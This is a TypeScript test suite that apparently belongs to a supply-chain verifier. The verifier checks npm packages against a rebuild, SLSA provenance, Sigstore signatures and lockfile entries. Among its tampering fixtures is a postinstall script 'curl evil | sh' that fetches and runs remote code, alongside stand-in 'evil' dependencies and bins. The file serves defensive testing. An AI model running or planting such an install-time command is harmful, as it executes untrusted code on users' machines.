// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * `npmVerify`'s orchestration, against fakes: what the registry and its
 * provenance must say, what is compared with the rebuild (the files npm
 * installs, direct and through the `@zuke/*` aliases), what counts as a failure
 * and what as a skip, and the seam to npm. Also the properties the npm build
 * needs for its output not to depend on the machine.
 *
 * @module
 */

import { absolutePath } from "../packages/core/mod.ts";
import {
  assertEquals,
  assertRejects,
  assertStringIncludes,
} from "../packages/core/tests/_assert.ts";
import type { ExpectedProvenance } from "../build/npm_provenance.ts";
import {
  auditSignatures,
  failures,
  type NpmProbe,
  type NpmSource,
  verifyAll,
  type VerifyDeps,
  type VerifyResult,
} from "../build/npm_verify.ts";
import { npmTsconfig } from "../build/npm_build.ts";
import { npmManifest } from "../build/npm_manifest.ts";
import {
  bundleOf,
  integrityOf,
  OURS,
  SLSA,
  statement,
  text,
} from "./_npm_verify.ts";

/** A world in which `@zuke-build/<pkg>`@1.0.0 is on npm, and what happened in it. */
interface World {
  deps: VerifyDeps;
  dir: string;
  log: {
    installs: string[][];
    waits: number;
    verified: unknown[];
    /** The policy each verified bundle was checked against. */
    policies: Array<{ certificateOIDs: Record<string, string> }>;
    /** Each rebuild: the commit and the packages built from it. */
    builds: Array<[string, readonly string[]]>;
    /** The commits asked about for master. */
    mastered: string[];
    manifest: Record<string, unknown>;
  };
}

const REBUILT = new Map([
  ["package.json", text('{"name":"@zuke-build/x","version":"1.0.0"}\n')],
  ["mod.js", text("export {};\n")],
]);

/** `y`, which imports `x` through its alias. */
const REBUILT_Y = new Map([
  [
    "package.json",
    text(
      '{"name":"@zuke-build/y","version":"1.0.0","dependencies":{"@zuke/x":"npm:@zuke-build/x@^1"}}\n',
    ),
  ],
]);

async function world(
  over: {
    installed?: Record<string, string>;
    /** What the alias directory `node_modules/@zuke/x` holds, when there is one. */
    aliasInstalled?: Record<string, string>;
    lockIntegrity?: string;
    document?: (integrity: string) => unknown;
    /** Fields the registry's metadata for the version has besides the rebuild's. */
    metadata?: Record<string, unknown>;
    /** What the install's lockfile holds besides `@zuke-build/x`. */
    lockExtra?: Record<string, unknown>;
    lockBin?: unknown;
    stmt?: Partial<ExpectedProvenance>;
    attested?: boolean;
    badSignature?: boolean;
    /** The commit the certificate attests; the signature fails for a policy pinned to another. */
    certCommit?: string;
    allowMissing?: boolean;
    /** The commit each package's statement names, where not `OURS.commit`. */
    commits?: Record<string, string>;
    /** Commits that are not on master. */
    offMaster?: string[];
    /** Commits whose rebuild throws. */
    brokenBuild?: string[];
    /** The packages the registry has; `x` unless given. */
    packages?: string[];
  } = {},
): Promise<World> {
  const dir = await Deno.makeTempDir();
  const { integrity, hex } = integrityOf(7);
  const installed = over.installed ?? {
    "package.json": '{"version":"1.0.0","name":"@zuke-build/x"}',
    "mod.js": "export {};\n",
  };
  const distOf = (pkg: string) => ({
    tarball: "t://x",
    integrity,
    ...(over.attested === false ? {} : {
      attestations: {
        url: `t://att/${pkg}`,
        provenance: { predicateType: SLSA },
      },
    }),
  });
  const log: World["log"] = {
    installs: [],
    waits: 0,
    verified: [],
    policies: [],
    builds: [],
    mastered: [],
    manifest: {},
  };
  const source: NpmSource = {
    document: (pkg) =>
      Promise.resolve(
        !(over.packages ?? ["x"]).includes(pkg)
          ? null
          : over.document?.(integrity) ??
            {
              versions: {
                "1.0.0": {
                  name: `@zuke-build/${pkg}`,
                  version: "1.0.0",
                  dist: distOf(pkg),
                  ...over.metadata,
                },
              },
            },
      ),
    attestations: (url) =>
      Promise.resolve({
        attestations: [{
          predicateType: SLSA,
          bundle: bundleOf(statement(hex, {
            ...over.stmt,
            commit: over.stmt?.commit ??
              over.commits?.[url.slice("t://att/".length)] ??
              OURS.commit,
          })),
        }],
      }),
    verifyBundle: (bundle, policy) => {
      log.verified.push(bundle);
      log.policies.push(policy);
      const pinned = policy.certificateOIDs["1.3.6.1.4.1.57264.1.3"];
      return over.badSignature ||
          (over.certCommit !== undefined && pinned !== over.certCommit)
        ? Promise.reject(new Error("the Sigstore bundle did not verify: no"))
        : Promise.resolve();
    },
  };
  const project = absolutePath(dir)("consumer");
  const write = async (out: string, files: Record<string, string>) => {
    for (const [path, data] of Object.entries(files)) {
      await Deno.mkdir(`${out}/${path}`.replace(/\/[^/]*$/, ""), {
        recursive: true,
      });
      await Deno.writeTextFile(`${out}/${path}`, data);
    }
  };
  const npm: NpmProbe = {
    install: async (_p, specs) => {
      log.installs.push(specs);
      log.manifest = JSON.parse(
        await Deno.readTextFile(`${project}/package.json`),
      );
      await write(`${project}/node_modules/@zuke-build/x`, installed);
      if (over.aliasInstalled !== undefined) {
        await write(`${project}/node_modules/@zuke/x`, over.aliasInstalled);
      }
      await Deno.writeTextFile(
        `${project}/package-lock.json`,
        JSON.stringify({
          packages: {
            "": { name: "consumer" },
            "node_modules/@zuke-build/x": {
              version: "1.0.0",
              integrity: over.lockIntegrity ?? integrity,
              ...(over.lockBin === undefined ? {} : { bin: over.lockBin }),
            },
            ...over.lockExtra,
          },
        }),
      );
    },
    auditSignatures: () => Promise.resolve(),
  };
  const deps: VerifyDeps = {
    source,
    npm,
    project,
    masterProblem: (commit) => {
      log.mastered.push(commit);
      return Promise.resolve(
        over.offMaster?.includes(commit)
          ? `provenance: ${commit} is off master.`
          : null,
      );
    },
    rebuildAt: (commit, pkgs) => {
      log.builds.push([commit, pkgs]);
      return over.brokenBuild?.includes(commit)
        ? Promise.reject(new Error("the build broke"))
        : Promise.resolve(
          new Map(pkgs.map((p) => [p, p === "y" ? REBUILT_Y : REBUILT])),
        );
    },
    allowMissing: over.allowMissing ?? false,
    attempts: 3,
    wait: () => {
      log.waits++;
      return Promise.resolve();
    },
  };
  return { dir, log, deps };
}

async function run(
  over: Parameters<typeof world>[0],
  ...pkgs: string[]
): Promise<{ w: World; result: Awaited<ReturnType<typeof verifyAll>> }> {
  const w = await world(over);
  try {
    return {
      w,
      result: await verifyAll(
        new Map((pkgs.length > 0 ? pkgs : ["x"]).map((p) => [p, "1.0.0"])),
        w.deps,
      ),
    };
  } finally {
    await Deno.remove(w.dir, { recursive: true });
  }
}

const problemsOf = (
  { result }: Awaited<ReturnType<typeof run>>,
  pkg = "x",
): string[] => {
  const r = result.get(pkg);
  return r?.status === "mismatch" ? r.problems : [];
};

Deno.test("verifyAll: installed files equal to the rebuild, with our provenance, match", async () => {
  const out = await run({});
  assertEquals(out.result.get("x"), { status: "match", version: "1.0.0" });
  assertEquals(out.w.log.installs, [["@zuke-build/x@1.0.0"]]);
  assertEquals(out.w.log.verified.length, 1);
});

Deno.test("verifyAll: a changed, an extra and a missing installed file are each reported", async () => {
  const out = await run({
    installed: {
      "package.json": '{"name":"@zuke-build/x","version":"1.0.0"}',
      "mod.js": "export const hacked = 1;\n",
      "extra.js": "",
    },
  });
  assertEquals(problemsOf(out), [
    "extra.js: installed from npm, not in the rebuild.",
    "mod.js: differs from the rebuild.",
  ]);
  const gone = await run({ installed: { "package.json": "{}" } });
  assertEquals(problemsOf(gone).length, 2);
});

Deno.test("verifyAll: a lockfile that records another integrity is a mismatch", async () => {
  const out = await run({ lockIntegrity: integrityOf(8).integrity });
  assertStringIncludes(problemsOf(out)[0], "version or integrity other than");
});

Deno.test("verifyAll: registry metadata that only adds its own bookkeeping matches", async () => {
  const out = await run({
    metadata: {
      _id: "@zuke-build/x@1.0.0",
      _npmVersion: "11.0.0",
      _nodeVersion: "24.0.0",
      gitHead: "abc",
      maintainers: [{ name: "m" }],
      directories: {},
      _hasShrinkwrap: false,
      author: { name: "a" },
    },
  });
  assertEquals(out.result.get("x")?.status, "match");
});

Deno.test("verifyAll: metadata that differs from the rebuilt package.json in a field npm acts on fails", async () => {
  const cases: Array<[string, Record<string, unknown>]> = [
    ["scripts", { scripts: { postinstall: "curl evil | sh" } }],
    ["dependencies", { dependencies: { evil: "1.0.0" } }],
    ["hasInstallScript", { hasInstallScript: true }],
    ["bin", { bin: { x: "evil.js" } }],
    ["os", { os: ["linux"] }],
    ["name", { name: "@zuke-build/y" }],
    ["version", { version: "1.0.0-evil" }],
    ["_hasShrinkwrap", { _hasShrinkwrap: true }],
    ["acceptDependencies", { acceptDependencies: { "@zuke/core": "*" } }],
  ];
  for (const [field, metadata] of cases) {
    const out = await run({ metadata });
    assertEquals(problemsOf(out), [
      `the registry's metadata for ${field} differs from the rebuilt package.json.`,
    ]);
  }
});

/** The lockfile entry of the alias `@zuke/x` as npm writes it, changed by `over`. */
function aliasEntry(over: Record<string, unknown> = {}) {
  return {
    "node_modules/@zuke/x": {
      name: "@zuke-build/x",
      version: "1.0.0",
      integrity: integrityOf(7).integrity,
      ...over,
    },
  };
}

Deno.test("verifyAll: a lockfile with another package, an install script or a bin fails", async () => {
  const other = await run({
    lockExtra: { "node_modules/evil": { version: "1.0.0" } },
  });
  assertStringIncludes(
    problemsOf(other)[0],
    "node_modules/evil, which is not one of ours",
  );
  const script = await run({
    lockExtra: aliasEntry({ hasInstallScript: true }),
  });
  assertStringIncludes(problemsOf(script)[0], "has an install script");
  const bin = await run({ lockBin: { x: "evil.js" } });
  assertStringIncludes(
    problemsOf(bin)[0],
    "has a bin other than the rebuild's",
  );
  const gone = await run({
    lockExtra: { "node_modules/@zuke-build/x": undefined },
  });
  assertStringIncludes(problemsOf(gone)[0], "no entry for @zuke-build/x");
});

Deno.test("verifyAll: every alias is pinned to the verified version, and matches it", async () => {
  const out = await run({
    lockExtra: aliasEntry(),
    aliasInstalled: {
      "package.json": '{"name":"@zuke-build/x","version":"1.0.0"}',
      "mod.js": "export {};\n",
    },
  });
  assertEquals(out.result.get("x")?.status, "match");
  assertEquals(out.w.log.manifest.overrides, {
    "@zuke/x": "npm:@zuke-build/x@1.0.0",
  });
});

Deno.test("verifyAll: an alias with another integrity, another version, other files or no verification fails", async () => {
  const integrity = await run({
    lockExtra: aliasEntry({ integrity: integrityOf(8).integrity }),
  });
  assertStringIncludes(
    problemsOf(integrity).join("\n"),
    "node_modules/@zuke/x with a version or integrity other than the verified",
  );
  const version = await run({ lockExtra: aliasEntry({ version: "1.0.1" }) });
  assertStringIncludes(
    problemsOf(version).join("\n"),
    "node_modules/@zuke/x with a version or integrity other than the verified",
  );
  const named = await run({ lockExtra: aliasEntry({ name: "evil" }) });
  assertStringIncludes(
    problemsOf(named).join("\n"),
    "is not an alias of @zuke-build/x",
  );
  const files = await run({
    lockExtra: aliasEntry(),
    aliasInstalled: {
      "package.json": '{"name":"@zuke-build/x","version":"1.0.0"}',
      "mod.js": "export const evil = 1;\n",
    },
  });
  assertEquals(problemsOf(files), [
    "alias @zuke/x: mod.js: differs from the rebuild.",
  ]);
  const unverified = await run({
    lockExtra: {
      "node_modules/@zuke/y": {
        name: "@zuke-build/y",
        version: "1.0.0",
        integrity: integrityOf(7).integrity,
      },
    },
  });
  assertStringIncludes(
    problemsOf(unverified).join("\n"),
    "node_modules/@zuke/y is a package that was not verified in this run",
  );
});

Deno.test("verifyAll: a package whose dependency is missing or failed is not verified either", async () => {
  // `x` is not on npm and that is allowed: it is skipped, and so is `y`.
  const skipped = await run(
    { packages: ["y"], allowMissing: true },
    "x",
    "y",
  );
  assertEquals(skipped.result.get("y"), {
    status: "skipped",
    reason:
      "it depends on @zuke-build/x, which was skipped (the package is not on npm.).",
    version: "1.0.0",
  });
  assertEquals(skipped.w.log.installs, []);
  const failed = await run({ packages: ["y"] }, "x", "y");
  assertEquals(problemsOf(failed, "y"), [
    "it depends on @zuke-build/x, which was not verified.",
  ]);
  assertStringIncludes(problemsOf(failed, "x")[0], "not on npm");
});

Deno.test("verifyAll: provenance for another repository, workflow, ref, commit or bytes fails before anything is installed", async () => {
  for (
    const stmt of [
      { repository: "https://github.com/evil/zuke" },
      { path: ".github/workflows/ci.yml" },
      { ref: "refs/heads/evil" },
      { commit: "bad" },
    ]
  ) {
    const out = await run({ stmt });
    assertStringIncludes(problemsOf(out)[0], "provenance: ");
    assertEquals(out.w.log.installs, []);
  }
  const other = await run({
    document: () => ({
      versions: {
        "1.0.0": {
          dist: {
            tarball: "t",
            integrity: integrityOf(8).integrity,
            attestations: { url: "u", provenance: { predicateType: SLSA } },
          },
        },
      },
    }),
  });
  assertStringIncludes(problemsOf(other)[0], "no subject has the sha512");
});

Deno.test("verifyAll: no attestation, or a bundle that does not verify, fails", async () => {
  assertEquals(problemsOf(await run({ attested: false })), [
    "the version has no SLSA provenance attestation.",
  ]);
  assertStringIncludes(
    problemsOf(await run({ badSignature: true }))[0],
    "did not verify",
  );
});

Deno.test("verifyAll: a version missing from npm fails after the retries, and is skipped only when allowed", async () => {
  const missing = await run({ document: () => ({ versions: {} }) });
  assertEquals(problemsOf(missing), ["version 1.0.0 is not on npm."]);
  assertEquals(missing.w.log.waits, 2);
  const never = await run({}, "y");
  assertEquals(problemsOf(never, "y"), ["the package is not on npm."]);
  const allowed = await run({ allowMissing: true }, "y");
  assertEquals(allowed.result.get("y"), {
    status: "skipped",
    reason: "the package is not on npm.",
    version: "1.0.0",
  });
  assertEquals(allowed.w.log.waits, 0);
});

Deno.test("verifyAll: a version entry without a usable dist is a failure, not a skip", async () => {
  const out = await run({
    document: () => ({ versions: { "1.0.0": { dist: { tarball: "t" } } } }),
  });
  assertStringIncludes(problemsOf(out)[0], "without a usable dist.tarball");
});

Deno.test("verifyAll: each distinct provenance commit is rebuilt once, with its own packages", async () => {
  const other = "abcdef0123456789abcdef0123456789abcdef01";
  const out = await run(
    { packages: ["x", "y", "z"], commits: { z: other } },
    "x",
    "y",
    "z",
  );
  assertEquals(out.w.log.builds, [
    [OURS.commit, ["x", "y"]],
    [other, ["z"]],
  ]);
  // Each version's certificate is pinned to the commit its own statement names.
  assertEquals(
    out.w.log.policies.map((p) => p.certificateOIDs["1.3.6.1.4.1.57264.1.3"]),
    [OURS.commit, OURS.commit, other],
  );
  assertEquals(out.w.log.mastered, [OURS.commit, OURS.commit, other]);
});

Deno.test("verifyAll: a commit that is not on master, or not a SHA, fails before any build", async () => {
  const off = await run({ offMaster: [OURS.commit] });
  assertEquals(problemsOf(off), [`provenance: ${OURS.commit} is off master.`]);
  assertEquals(off.w.log.builds, []);
  assertEquals(off.w.log.installs, []);
  const bad = await run({ stmt: { commit: "1234abc" } });
  assertStringIncludes(problemsOf(bad)[0], "is not a full 40-hex git SHA");
  assertEquals(bad.w.log.mastered, []);
  assertEquals(bad.w.log.verified, []);
  // A signature that does not hold is not asked about master at all.
  const unsigned = await run({ badSignature: true });
  assertEquals(unsigned.w.log.mastered, []);
});

Deno.test("verifyAll: a statement commit the certificate does not attest fails before master or a build", async () => {
  // The statement says OURS.commit; the certificate was issued for another.
  const out = await run({ certCommit: "e".repeat(40) });
  assertStringIncludes(problemsOf(out)[0], "did not verify");
  assertEquals(
    out.w.log.policies[0].certificateOIDs["1.3.6.1.4.1.57264.1.3"],
    OURS.commit,
  );
  assertEquals(out.w.log.mastered, []);
  assertEquals(out.w.log.builds, []);
  const same = await run({ certCommit: OURS.commit });
  assertEquals(same.result.get("x")?.status, "match");
});

Deno.test("verifyAll: a commit that cannot be rebuilt fails its packages and not the others", async () => {
  const other = "abcdef0123456789abcdef0123456789abcdef01";
  const out = await run(
    {
      packages: ["x", "y"],
      commits: { y: other },
      brokenBuild: [other],
    },
    "x",
    "y",
  );
  assertEquals(out.result.get("x")?.status, "match");
  assertEquals(problemsOf(out, "y"), [
    `rebuilding ${other} failed: the build broke`,
  ]);
});

Deno.test("only mismatches fail, and comparing nothing fails unless allowed", () => {
  const ok: VerifyResult = { status: "match" };
  const skipped: VerifyResult = { status: "skipped", reason: "no" };
  const bad: VerifyResult = {
    status: "mismatch",
    problems: ["a.js: differs."],
  };
  assertEquals(
    failures(new Map<string, VerifyResult>([["x", ok], ["y", skipped]]), false),
    [],
  );
  assertEquals(failures(new Map<string, VerifyResult>([["x", bad]]), true), [
    "@zuke-build/x: a.js: differs.",
  ]);
  assertStringIncludes(
    failures(new Map<string, VerifyResult>([["y", skipped]]), false)[0],
    "nothing was compared",
  );
  assertEquals(
    failures(new Map<string, VerifyResult>([["y", skipped]]), true),
    [],
  );
});

Deno.test("auditSignatures: a failing npm fails it", async () => {
  const npm = (fail: boolean): NpmProbe => ({
    install: () => Promise.resolve(),
    auditSignatures: () =>
      fail
        ? Promise.reject(new Error("missing signatures"))
        : Promise.resolve(),
  });
  const project = absolutePath("/p");
  await auditSignatures(project, npm(false));
  await assertRejects(
    () => auditSignatures(project, npm(true)),
    Error,
    "npm audit signatures failed: missing signatures",
  );
});

Deno.test("the npm build pins LF, and a manifest does not depend on key order or path", () => {
  const config = npmTsconfig([], "/a/packages", "/a/dist");
  const options = config.compilerOptions;
  assertEquals(
    typeof options === "object" && options !== null && "newLine" in options &&
      options.newLine,
    "lf",
  );
  const deno = {
    name: "@zuke/x",
    version: "1.0.0",
    exports: { ".": "./mod.ts", "./b": "./src/b.ts" },
    imports: { "@zuke/core": "jsr:@zuke/core@^1", "@zuke/a": "jsr:@zuke/a@^1" },
  };
  const json = JSON.stringify(npmManifest(deno));
  assertEquals(JSON.stringify(npmManifest(deno)), json);
  assertEquals(Object.keys(JSON.parse(json).dependencies), [
    "@zuke/a",
    "@zuke/core",
  ]);
  assertEquals(json.includes("/home"), false);
});
